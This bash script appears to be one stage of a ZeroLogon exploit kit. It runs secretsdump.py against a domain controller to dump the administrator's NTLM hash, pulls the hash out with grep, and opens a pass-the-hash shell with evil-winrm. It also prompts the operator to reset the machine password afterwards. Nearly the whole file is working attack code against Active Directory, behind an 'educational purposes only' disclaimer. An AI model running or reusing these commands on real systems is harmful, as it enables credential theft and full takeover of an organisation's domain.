#! /bin/bash
#NOTE:This file and others in this project are still under construction, if you wish to use this script to learn please change the paths to ones that will work for you
#Disclaimers: This project is for educational purposes only and is not to be used in any malicious fasion.
echo
echo "Currently Dumping Passwords for:" $Domain2 $DcName2 $ipAddrs2
echo
echo "Please click enter Sir/Madam/Non-Binary"
secretsdump.py -outputfile /home/kali/Desktop/ZeroLogon/exploitkit/dumps/secret.txt -just-dc-user administrator $Domain2/$DcName2\$@$ipAddrs2 > somefile.txt
#rm somefile.txt
TEST="$(grep -o '....................................$' dumps/secret.txt.ntds | tr -d ':')"
export TEST2=$TEST
echo "Password dump complete " 
echo
echo "Logging you into the DC" 
echo "Please issue the next command once you have a shell on the DC <powershell.exe -c 'Reset-ComputerMachinePassword'>"
evil-winrm -i $ipAddrs2 -u Administrator -H $TEST
